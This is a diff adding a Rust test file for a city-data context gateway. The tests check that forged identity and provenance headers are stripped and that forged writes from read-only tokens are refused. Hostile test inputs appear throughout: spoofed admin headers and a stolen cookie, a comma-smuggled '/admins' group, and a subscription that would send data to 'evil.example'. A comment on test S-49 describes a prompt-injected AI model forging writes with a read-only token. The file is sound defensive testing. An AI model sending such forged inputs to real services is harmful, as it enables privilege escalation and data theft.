@@ -1,0 +1,776 @@
+//! The subject the broker decides on is the one the gateway verified (T-3641, map G15, K36).
+//!
+//! The broker's `joinedcontext` engine reads the caller from `x-jc-subject`, `x-jc-groups`,
+//! `x-jc-roles`, `x-jc-client` and `x-jc-restricted`, and treats a request with none of them as
+//! the cluster's own. So every hop to the broker carries the verified values, none the client
+//! wrote, at least `x-jc-roles` even for an anonymous caller, and never the caller's
+//! `Authorization` or `Cookie`: the broker is not the audience of either.
+
+use crate::common;
+
+use axum::body::Body;
+use axum::http::{HeaderMap, Method, Request, StatusCode};
+use axum::Router;
+use context_gateway::app::{router, Gateway};
+use context_gateway::auth::accounts::ServiceAccounts;
+use context_gateway::pdp::PolicyPdp;
+use context_gateway::proxy::Broker;
+use context_gateway::resolver::Endpoint;
+use jc_core::kinds::{Audience, PolicySpec, Representation};
+use serde_json::{json, Value};
+use std::sync::Arc;
+use tower::ServiceExt;
+
+const HOST: &str = "https://city.example";
+const AIR: &str = "aaaaaaaaaaaaaaaaaaaaaaaaaa";
+const OPEN: &str = "eeeeeeeeeeeeeeeeeeeeeeeeee";
+const ENTITY: &str = "urn:ngsi-ld:AirQualityObserved:st-1";
+
+/// What a client writes to pass for somebody else.
+const FORGED: &[(&str, &str)] = &[
+    ("x-jc-subject", "admin"),
+    ("X-JC-Groups", "/admins"),
+    ("x-jc-roles", "admin"),
+    ("x-jc-client", "portal-api"),
+    ("x-jc-restricted", "true"),
+    ("x-jc-did", "did:web:forged.example"),
+    ("x-jc-read-only", "false"),
+    ("cookie", "session=stolen"),
+];
+
+fn grant(role: &str) -> PolicySpec {
+    serde_norway::from_str(&format!(
+        "contextSpaceRef: ovzdusie\n\
+         assigner: did:web:banskabystrica.sk\n\
+         assignee: {{ kind: role, id: {role} }}\n\
+         operations: [queryEntity, createEntity]\n\
+         information:\n  \
+         - entities:\n      \
+         - type: AirQualityObserved\n"
+    ))
+    .expect("the policy spec parses")
+}
+
+fn endpoint(slug: &str, audience: Audience, role: &str) -> Endpoint {
+    Endpoint {
+        declared_types: None,
+        roles: Default::default(),
+        slug: slug.to_owned(),
+        title: Default::default(),
+        description: Default::default(),
+        space: "ovzdusie".to_owned(),
+        project: "ovzdusie".to_owned(),
+        audience,
+        allowed_projects: Vec::new(),
+        representations: vec![Representation::NgsiLd, Representation::Mcp],
+        rate_limit: None,
+        creates: None,
+        file_limits: None,
+        hidden_attributes: Default::default(),
+        projection: None,
+        view_mapping: None,
+        catalog: None,
+        deprecation: None,
+        feeds: Vec::new(),
+        calendars: Vec::new(),
+        map_defaults: Default::default(),
+        base_path: format!("/api/endpoint/{slug}"),
+        models: Vec::new(),
+        policy_names: Vec::new(),
+        manifest_name: String::new(),
+        policies: vec![grant(role)],
+    }
+}
+
+fn app(broker: &str, realm: &common::Realm) -> Router {
+    let gateway = Gateway::new(
+        Broker::new(broker),
+        Box::new(PolicyPdp),
+        "banskabystrica.sk",
+    )
+    .serve(vec![
+        endpoint(AIR, Audience::Organization, "steward"),
+        endpoint(OPEN, Audience::Public, "public"),
+    ])
+    .authenticate(
+        Arc::new(realm.verifier()),
+        ServiceAccounts::new(),
+        Some(HOST.to_owned()),
+    );
+    router(Arc::new(gateway))
+}
+
+fn token(realm: &common::Realm, groups: Value) -> String {
+    realm.mint(&json!({
+        "iss": common::ISSUER,
+        "sub": "0f5a",
+        "aud": "context-gateway",
+        "preferred_username": "jana",
+        "groups": groups,
+        "realm_access": { "roles": ["steward"] },
+        "exp": common::in_seconds(300),
+        "iat": common::in_seconds(-10),
+    }))
+}
+
+fn request(
+    method: Method,
+    path: &str,
+    token: Option<&str>,
+    extra: &[(&str, &str)],
+    body: Option<Value>,
+) -> Request<Body> {
+    let mut builder = Request::builder().method(method).uri(path);
+    if let Some(token) = token {
+        builder = builder.header("authorization", format!("Bearer {token}"));
+    }
+    for (name, value) in FORGED.iter().chain(extra) {
+        builder = builder.header(*name, *value);
+    }
+    let body = match body {
+        Some(body) => {
+            builder = builder.header("content-type", "application/json");
+            Body::from(body.to_string())
+        }
+        None => Body::empty(),
+    };
+    builder.body(body).expect("a request")
+}
+
+async fn status(app: Router, request: Request<Body>) -> StatusCode {
+    let response = app.oneshot(request).await.expect("the gateway answers");
+    let status = response.status();
+    let bytes = axum::body::to_bytes(response.into_body(), 1024 * 1024)
+        .await
+        .expect("a body");
+    assert!(
+        status.is_success(),
+        "{status}: {}",
+        String::from_utf8_lossy(&bytes)
+    );
+    status
+}
+
+/// Every value of `name` the hop carried.
+fn values(headers: &HeaderMap, name: &str) -> Vec<String> {
+    headers
+        .get_all(name)
+        .iter()
+        .map(|value| String::from_utf8_lossy(value.as_bytes()).into_owned())
+        .collect()
+}
+
+fn list(headers: &HeaderMap, name: &str) -> Vec<String> {
+    let mut members: Vec<String> = values(headers, name)
+        .iter()
+        .flat_map(|value| value.split(',').map(str::to_owned).collect::<Vec<_>>())
+        .collect();
+    members.sort();
+    members
+}
+
+/// What reached the broker carries the verified caller and nothing the client wrote; groups as
+/// the gateway matches them, without the leading slash.
+fn assert_verified(headers: &HeaderMap, groups: &[&str]) {
+    // The person's Keycloak id, the token's `sub`, never their username (PF-126).
+    assert_eq!(values(headers, "x-jc-subject"), ["0f5a"], "{headers:?}");
+    assert_eq!(list(headers, "x-jc-groups"), groups, "{headers:?}");
+    let roles = list(headers, "x-jc-roles");
+    assert!(roles.contains(&"steward".to_owned()), "{headers:?}");
+    assert!(!roles.contains(&"admin".to_owned()), "{headers:?}");
+    assert!(values(headers, "x-jc-client").is_empty(), "{headers:?}");
+    assert!(values(headers, "x-jc-restricted").is_empty(), "{headers:?}");
+    assert!(values(headers, "x-jc-did").is_empty(), "{headers:?}");
+    assert!(values(headers, "x-jc-read-only").is_empty(), "{headers:?}");
+    assert!(headers.get("authorization").is_none(), "{headers:?}");
+    assert!(headers.get("cookie").is_none(), "{headers:?}");
+}
+
+fn query() -> String {
+    format!("/api/endpoint/{AIR}/ngsi-ld/v1/entities?type=AirQualityObserved")
+}
+
+#[tokio::test]
+async fn a_query_carries_the_verified_subject_and_not_the_forged_one() {
+    let realm = common::Realm::new();
+    let broker = common::BrokerStub::start(vec![json!([])]).await;
+    let edge = token(&realm, json!(["/ovzdusie", "/doprava"]));
+
+    status(
+        app(&broker.url, &realm),
+        request(Method::GET, &query(), Some(&edge), &[], None),
+    )
+    .await;
+
+    let hops = broker.hops();
+    assert!(!hops.is_empty());
+    for hop in hops {
+        assert_verified(&hop.headers, &["doprava", "ovzdusie"]);
+    }
+}
+
+#[tokio::test]
+async fn a_write_carries_the_verified_subject_and_not_the_token() {
+    let realm = common::Realm::new();
+    let broker = common::BrokerStub::start(vec![json!([])]).await;
+    let edge = token(&realm, json!(["/ovzdusie"]));
+    let entity = json!({ "id": ENTITY, "type": "AirQualityObserved" });
+
+    status(
+        app(&broker.url, &realm),
+        request(
+            Method::POST,
+            &format!("/api/endpoint/{AIR}/ngsi-ld/v1/entities"),
+            Some(&edge),
+            &[],
+            Some(entity),
+        ),
+    )
+    .await;
+
+    let hops = broker.hops();
+    assert_eq!(hops.len(), 1, "{hops:?}");
+    assert_verified(&hops[0].headers, &["ovzdusie"]);
+}
+
+#[tokio::test]
+async fn an_anonymous_caller_still_names_its_roles_so_the_broker_never_reads_it_as_internal() {
+    let realm = common::Realm::new();
+    let broker = common::BrokerStub::start(vec![json!([])]).await;
+
+    status(
+        app(&broker.url, &realm),
+        request(
+            Method::GET,
+            &format!("/api/endpoint/{OPEN}/ngsi-ld/v1/entities?type=AirQualityObserved"),
+            None,
+            &[],
+            None,
+        ),
+    )
+    .await;
+
+    let hops = broker.hops();
+    assert_eq!(hops.len(), 1, "{hops:?}");
+    let headers = &hops[0].headers;
+    assert!(values(headers, "x-jc-subject").is_empty(), "{headers:?}");
+    assert!(values(headers, "x-jc-client").is_empty(), "{headers:?}");
+    assert!(values(headers, "x-jc-groups").is_empty(), "{headers:?}");
+    assert_eq!(list(headers, "x-jc-roles"), ["public"], "{headers:?}");
+    assert!(headers.get("cookie").is_none(), "{headers:?}");
+}
+
+#[tokio::test]
+async fn the_restricted_signal_is_forwarded_only_when_the_caller_opted_in() {
+    let realm = common::Realm::new();
+    let broker = common::BrokerStub::start(vec![json!([])]).await;
+    let edge = token(&realm, json!(["/ovzdusie"]));
+
+    status(
+        app(&broker.url, &realm),
+        request(
+            Method::GET,
+            &query(),
+            Some(&edge),
+            &[("NGSILD-Results-Restricted", "true")],
+            None,
+        ),
+    )
+    .await;
+
+    let hops = broker.hops();
+    assert_eq!(hops.len(), 1, "{hops:?}");
+    assert_eq!(values(&hops[0].headers, "x-jc-restricted"), ["true"]);
+}
+
+#[tokio::test]
+async fn a_group_whose_name_holds_a_comma_is_not_split_into_two_groups() {
+    let realm = common::Realm::new();
+    let broker = common::BrokerStub::start(vec![json!([])]).await;
+    // The broker splits the list on commas: forwarded as is, this one group would hand the
+    // caller `/admins` as well. Encoded, it stays one name.
+    let edge = token(&realm, json!(["/ovzdusie", "/x,/admins"]));
+
+    status(
+        app(&broker.url, &realm),
+        request(Method::GET, &query(), Some(&edge), &[], None),
+    )
+    .await;
+
+    let hops = broker.hops();
+    assert_eq!(hops.len(), 1, "{hops:?}");
+    assert_eq!(
+        list(&hops[0].headers, "x-jc-groups"),
+        ["ovzdusie", "x%2C%2Fadmins"]
+    );
+}
+
+/// T-3770: a name with a diacritic or a reserved character reaches the broker percent-encoded
+/// (UTF-8, RFC 3986 unreserved kept), one member at a time; the others stay as they are.
+#[tokio::test]
+async fn names_beyond_plain_ascii_reach_the_broker_percent_encoded() {
+    let realm = common::Realm::new();
+    let broker = common::BrokerStub::start(vec![json!([])]).await;
+    let edge = realm.mint(&json!({
+        "iss": common::ISSUER,
+        "sub": "jožo",
+        "aud": "context-gateway",
+        "preferred_username": "jožo",
+        "groups": ["/ovzdusie", "/doprava/správa"],
+        "realm_access": { "roles": ["steward", "správca"] },
+        "exp": common::in_seconds(300),
+        "iat": common::in_seconds(-10),
+    }));
+
+    status(
+        app(&broker.url, &realm),
+        request(Method::GET, &query(), Some(&edge), &[], None),
+    )
+    .await;
+
+    let hops = broker.hops();
+    assert_eq!(hops.len(), 1, "{hops:?}");
+    let headers = &hops[0].headers;
+    assert_eq!(
+        values(headers, "x-jc-subject"),
+        ["jo%C5%BEo"],
+        "{headers:?}"
+    );
+    assert_eq!(
+        list(headers, "x-jc-groups"),
+        ["doprava%2Fspr%C3%A1va", "ovzdusie"]
+    );
+    let roles = list(headers, "x-jc-roles");
+    assert!(roles.contains(&"steward".to_owned()), "{roles:?}");
+    assert!(roles.contains(&"spr%C3%A1vca".to_owned()), "{roles:?}");
+}
+
+#[tokio::test]
+async fn a_tool_call_reenters_with_the_verified_subject_and_not_the_token() {
+    let realm = common::Realm::new();
+    let broker = common::BrokerStub::start(vec![json!([
+        { "id": ENTITY, "type": "AirQualityObserved" }
+    ])])
+    .await;
+    let edge = token(&realm, json!(["/ovzdusie"]));
+    let call = json!({
+        "jsonrpc": "2.0",
+        "id": 1,
+        "method": "tools/call",
+        "params": {
+            "name": "query_entities",
+            "arguments": { "type": "AirQualityObserved" },
+        },
+    });
+
+    status(
+        app(&broker.url, &realm),
+        request(
+            Method::POST,
+            &format!("/api/endpoint/{AIR}/mcp"),
+            Some(&edge),
+            &[],
+            Some(call),
+        ),
+    )
+    .await;
+
+    let hops = broker.hops();
+    assert!(!hops.is_empty());
+    for hop in hops {
+        assert_verified(&hop.headers, &["ovzdusie"]);
+    }
+}
+
+/// A person's token issued to `azp`, `portal-ui` being the Portal's UI.
+fn token_of(realm: &common::Realm, azp: &str) -> String {
+    realm.mint(&json!({
+        "iss": common::ISSUER,
+        "sub": "0f5a",
+        "aud": "context-gateway",
+        "azp": azp,
+        "preferred_username": "jana",
+        "groups": ["/ovzdusie"],
+        "realm_access": { "roles": ["steward"] },
+        "exp": common::in_seconds(300),
+        "iat": common::in_seconds(-10),
+    }))
+}
+
+/// What a client writes to pass for another writer (ADR-N-054 2.3, DM-112).
+const FORGED_PROVENANCE: &[(&str, &str)] = &[
+    ("jc-provenance-actor", "pipeline:other"),
+    ("JC-Provenance-Channel", "pipeline"),
+    ("jc-provenance-operation", "erase"),
+    ("jc-read-versions", "true"),
+];
+
+async fn answer(app: Router, request: Request<Body>) -> (StatusCode, Value) {
+    let response = app.oneshot(request).await.expect("the gateway answers");
+    let status = response.status();
+    let bytes = axum::body::to_bytes(response.into_body(), 1024 * 1024)
+        .await
+        .expect("a body");
+    (
+        status,
+        serde_json::from_slice(&bytes).unwrap_or(Value::Null),
+    )
+}
+
+#[tokio::test]
+async fn a_write_names_the_verified_writer_and_drops_the_one_the_client_typed() {
+    let realm = common::Realm::new();
+    let broker = common::BrokerStub::start(vec![json!([])]).await;
+    let entity = json!({ "id": ENTITY, "type": "AirQualityObserved" });
+
+    status(
+        app(&broker.url, &realm),
+        request(
+            Method::POST,
+            &format!("/api/endpoint/{AIR}/ngsi-ld/v1/entities"),
+            Some(&token(&realm, json!(["/ovzdusie"]))),
+            FORGED_PROVENANCE,
+            Some(entity),
+        ),
+    )
+    .await;
+
+    let hops = broker.hops();
+    assert_eq!(hops.len(), 1, "{hops:?}");
+    let headers = &hops[0].headers;
+    assert_eq!(
+        values(headers, "jc-provenance-channel"),
+        ["api"],
+        "{headers:?}"
+    );
+    assert_eq!(
+        values(headers, "jc-provenance-actor"),
+        ["user%3Ajana"],
+        "{headers:?}"
+    );
+    assert!(
+        values(headers, "jc-provenance-operation").is_empty(),
+        "{headers:?}"
+    );
+    assert!(
+        values(headers, "jc-read-versions").is_empty(),
+        "{headers:?}"
+    );
+    // A write that came with no request id gets one, which the broker stores (T-5361).
+    let ids = values(headers, "x-request-id");
+    assert_eq!(
+        ids.iter().map(|id| id.len()).collect::<Vec<_>>(),
+        [36],
+        "{headers:?}"
+    );
+}
+
+/// A person's write through the Portal's UI is channel `ui`, and the reason they gave reaches
+/// the broker as written (DM-113).
+#[tokio::test]
+async fn a_write_from_the_portal_ui_is_channel_ui_and_carries_its_reason() {
+    let realm = common::Realm::new();
+    let broker = common::BrokerStub::start(vec![json!([])]).await;
+    let entity = json!({ "id": ENTITY, "type": "AirQualityObserved" });
+
+    status(
+        app(&broker.url, &realm),
+        request(
+            Method::POST,
+            &format!("/api/endpoint/{AIR}/ngsi-ld/v1/entities"),
+            Some(&token_of(&realm, "portal-ui")),
+            &[("jc-reason", "Sensor%20stuck"), ("x-request-id", "9a07")],
+            Some(entity),
+        ),
+    )
+    .await;
+    let hops = broker.hops();
+    assert_eq!(hops.len(), 1, "{hops:?}");
+    let headers = &hops[0].headers;
+    assert_eq!(
+        values(headers, "jc-provenance-channel"),
+        ["ui"],
+        "{headers:?}"
+    );
+    assert_eq!(
+        values(headers, "jc-provenance-actor"),
+        ["user%3Ajana"],
+        "{headers:?}"
+    );
+    assert_eq!(
+        values(headers, "jc-reason"),
+        ["Sensor%20stuck"],
+        "{headers:?}"
+    );
+    // The edge's request id travels on, so the row and the edge log name the same request.
+    assert_eq!(values(headers, "x-request-id"), ["9a07"], "{headers:?}");
+}
+
+#[tokio::test]
+async fn a_delete_without_a_reason_is_refused_before_the_broker() {
+    let realm = common::Realm::new();
+    let broker = common::BrokerStub::start(vec![json!([])]).await;
+    let path = format!("/api/endpoint/{AIR}/ngsi-ld/v1/entities/{ENTITY}");
+    let edge = token(&realm, json!(["/ovzdusie"]));
+
+    let (code, problem) = answer(
+        app(&broker.url, &realm),
+        request(Method::DELETE, &path, Some(&edge), &[], None),
+    )
+    .await;
+    assert_eq!(code, StatusCode::BAD_REQUEST, "{problem}");
+    assert_eq!(problem["code"], "reason-required", "{problem}");
+    assert!(broker.hops().is_empty());
+
+    let (code, _) = answer(
+        app(&broker.url, &realm),
+        request(
+            Method::DELETE,
+            &path,
+            Some(&edge),
+            &[("jc-reason", "duplicate")],
+            None,
+        ),
+    )
+    .await;
+    assert_ne!(code, StatusCode::BAD_REQUEST);
+    assert_eq!(broker.hops().len(), 1);
+
+    // The Portal's UI asks a reason too (DM-113): its token, not a header, says it is the UI.
+    let ui = token_of(&realm, "portal-ui");
+    let (code, problem) = answer(
+        app(&broker.url, &realm),
+        request(Method::DELETE, &path, Some(&ui), &[], None),
+    )
+    .await;
+    assert_eq!(code, StatusCode::BAD_REQUEST, "{problem}");
+    assert_eq!(problem["code"], "reason-required", "{problem}");
+    assert_eq!(broker.hops().len(), 1);
+}
+
+/// DM-113: every write of context data from the Portal's UI names why in 1 to 500 characters;
+/// another client's create needs none, and a blank (percent-encoded) reason is none.
+#[tokio::test]
+async fn a_write_from_the_portal_ui_without_a_reason_is_refused_before_the_broker() {
+    let realm = common::Realm::new();
+    let broker = common::BrokerStub::start(vec![json!([])]).await;
+    let path = format!("/api/endpoint/{AIR}/ngsi-ld/v1/entities");
+    let entity = json!({ "id": ENTITY, "type": "AirQualityObserved" });
+    let ui = token_of(&realm, "portal-ui");
+
+    let long = "x".repeat(501);
+    for reason in [None, Some("%20%20"), Some(long.as_str())] {
+        let headers: Vec<(&str, &str)> = reason.map(|r| ("jc-reason", r)).into_iter().collect();
+        let (code, problem) = answer(
+            app(&broker.url, &realm),
+            request(
+                Method::POST,
+                &path,
+                Some(&ui),
+                &headers,
+                Some(entity.clone()),
+            ),
+        )
+        .await;
+        assert_eq!(code, StatusCode::BAD_REQUEST, "{problem}");
+        assert_eq!(problem["code"], "reason-required", "{problem}");
+        assert!(broker.hops().is_empty(), "{:?}", broker.hops());
+    }
+
+    let edge = token(&realm, json!(["/ovzdusie"]));
+    let (code, problem) = answer(
+        app(&broker.url, &realm),
+        request(Method::POST, &path, Some(&edge), &[], Some(entity)),
+    )
+    .await;
+    assert_ne!(code, StatusCode::BAD_REQUEST, "{problem}");
+    assert_eq!(broker.hops().len(), 1);
+}
+
+/// ADR-N-054 2.4, DM-114: the broker answers `versions=all` only when the gateway says the space's
+/// Policy grants the caller `readVersions`; a caller typing the header gets nothing from it.
+#[tokio::test]
+async fn read_versions_reaches_the_broker_only_on_the_spaces_grant() {
+    let realm = common::Realm::new();
+    let broker = common::BrokerStub::start(vec![json!([]), json!([])]).await;
+    let versions: PolicySpec = serde_norway::from_str(
+        "contextSpaceRef: ovzdusie\nassigner: did:web:banskabystrica.sk\n\
+         assignee: { kind: role, id: steward }\nactions: [readVersions]\n",
+    )
+    .expect("the policy spec parses");
+    let mut granted = endpoint(AIR, Audience::Organization, "steward");
+    granted.policies.push(versions);
+    let gateway = |endpoint: Endpoint| {
+        router(Arc::new(
+            Gateway::new(
+                Broker::new(&broker.url),
+                Box::new(PolicyPdp),
+                "banskabystrica.sk",
+            )
+            .serve(vec![endpoint])
+            .authenticate(
+                Arc::new(realm.verifier()),
+                ServiceAccounts::new(),
+                Some(HOST.to_owned()),
+            ),
+        ))
+    };
+    let path = format!("/api/endpoint/{AIR}/ngsi-ld/v1/temporal/entities/{ENTITY}?versions=all");
+    let edge = token(&realm, json!(["/ovzdusie"]));
+    for endpoint in [granted, endpoint(AIR, Audience::Organization, "steward")] {
+        let _ = answer(
+            gateway(endpoint),
+            request(
+                Method::GET,
+                &path,
+                Some(&edge),
+                &[("jc-read-versions", "true")],
+                None,
+            ),
+        )
+        .await;
+    }
+    let hops = broker.hops();
+    assert_eq!(hops.len(), 2, "{hops:?}");
+    assert_eq!(values(&hops[0].headers, "jc-read-versions"), ["true"]);
+    assert!(
+        values(&hops[1].headers, "jc-read-versions").is_empty(),
+        "{:?}",
+        hops[1].headers
+    );
+}
+
+/// Jana's token with `scope`: `jc:read-only` makes it a read-only connector's (T-5955).
+fn scoped_token(realm: &common::Realm, scope: &str) -> String {
+    realm.mint(&json!({
+        "iss": common::ISSUER,
+        "sub": "0f5a",
+        "aud": "context-gateway",
+        "preferred_username": "jana",
+        "groups": ["/ovzdusie"],
+        "realm_access": { "roles": ["steward"] },
+        "scope": scope,
+        "exp": common::in_seconds(300),
+        "iat": common::in_seconds(-10),
+    }))
+}
+
+/// The organization Endpoint with a steward grant of every write the tests forge.
+fn writer_app(broker: &str, realm: &common::Realm) -> Router {
+    let mut air = endpoint(AIR, Audience::Organization, "steward");
+    air.policies = vec![serde_norway::from_str(
+        "contextSpaceRef: ovzdusie\n\
+         assigner: did:web:banskabystrica.sk\n\
+         assignee: { kind: role, id: steward }\n\
+         operations: [queryEntity, retrieveEntity, createEntity, updateAttrs, appendAttrs, \
+         deleteEntity, upsertBatch, mergeEntity, createSubscription]\n",
+    )
+    .expect("the policy spec parses")];
+    let gateway = Gateway::new(
+        Broker::new(broker),
+        Box::new(PolicyPdp),
+        "banskabystrica.sk",
+    )
+    .serve(vec![air])
+    .authenticate(
+        Arc::new(realm.verifier()),
+        ServiceAccounts::new(),
+        Some(HOST.to_owned()),
+    );
+    router(Arc::new(gateway))
+}
+
+/// S-49 (T-5955): a prompt-injected model holding a read-only connector's token forges writes
+/// below the tools. Each is refused 403 before the broker, although the person may write; the
+/// same requests with the person's ordinary token pass the gateway. Reads go on, and the hop
+/// tells the broker the caller is read-only, so its own engine refuses a write too.
+#[tokio::test]
+async fn a_read_only_token_reads_and_every_forged_write_is_refused_before_the_broker() {
+    let realm = common::Realm::new();
+    let base = format!("/api/endpoint/{AIR}/ngsi-ld/v1");
+    let entity = json!({ "id": ENTITY, "type": "AirQualityObserved" });
+    let attrs = json!({ "pm10": { "type": "Property", "value": 1 } });
+    let writes = [
+        (
+            Method::POST,
+            format!("{base}/entities"),
+            Some(entity.clone()),
+        ),
+        (
+            Method::PATCH,
+            format!("{base}/entities/{ENTITY}/attrs"),
+            Some(attrs.clone()),
+        ),
+        (
+            Method::POST,
+            format!("{base}/entities/{ENTITY}/attrs"),
+            Some(attrs.clone()),
+        ),
+        (
+            Method::PATCH,
+            format!("{base}/entities/{ENTITY}"),
+            Some(attrs),
+        ),
+        (Method::DELETE, format!("{base}/entities/{ENTITY}"), None),
+        (
+            Method::POST,
+            format!("{base}/entityOperations/upsert"),
+            Some(json!([entity])),
+        ),
+        (
+            Method::POST,
+            format!("{base}/subscriptions"),
+            Some(
+                json!({ "type": "Subscription", "entities": [{ "type": "AirQualityObserved" }],
+                         "notification": { "endpoint": { "uri": "https://evil.example/n" } } }),
+            ),
+        ),
+        (
+            Method::POST,
+            format!("/api/endpoint/{AIR}/mcp"),
+            Some(json!({ "jsonrpc": "2.0", "id": 1, "method": "tools/call",
+                         "params": { "name": "batch_delete", "arguments": { "ids": [ENTITY] } } })),
+        ),
+    ];
+    let reason = [("jc-reason", "S-49")];
+    for (method, path, body) in &writes {
+        let broker = common::BrokerStub::start(vec![json!([])]).await;
+        let app = writer_app(&broker.url, &realm);
+        let forged = request(
+            method.clone(),
+            path,
+            Some(&scoped_token(&realm, "openid jc:read-only")),
+            &reason,
+            body.clone(),
+        );
+        let (code, problem) = answer(app.clone(), forged).await;
+        assert_eq!(code, StatusCode::FORBIDDEN, "{method} {path}: {problem}");
+        let hops = broker.hops();
+        assert!(hops.is_empty(), "{method} {path}: {hops:?}");
+        let person = request(
+            method.clone(),
+            path,
+            Some(&scoped_token(&realm, "openid")),
+            &reason,
+            body.clone(),
+        );
+        let (code, problem) = answer(app, person).await;
+        assert_ne!(code, StatusCode::FORBIDDEN, "{method} {path}: {problem}");
+    }
+
+    let broker = common::BrokerStub::start(vec![json!([])]).await;
+    status(
+        writer_app(&broker.url, &realm),
+        request(
+            Method::GET,
+            &query(),
+            Some(&scoped_token(&realm, "openid jc:read-only")),
+            &[],
+            None,
+        ),
+    )
+    .await;
+    let hops = broker.hops();
+    assert_eq!(hops.len(), 1, "{hops:?}");
+    assert_eq!(values(&hops[0].headers, "x-jc-read-only"), ["true"]);
+}
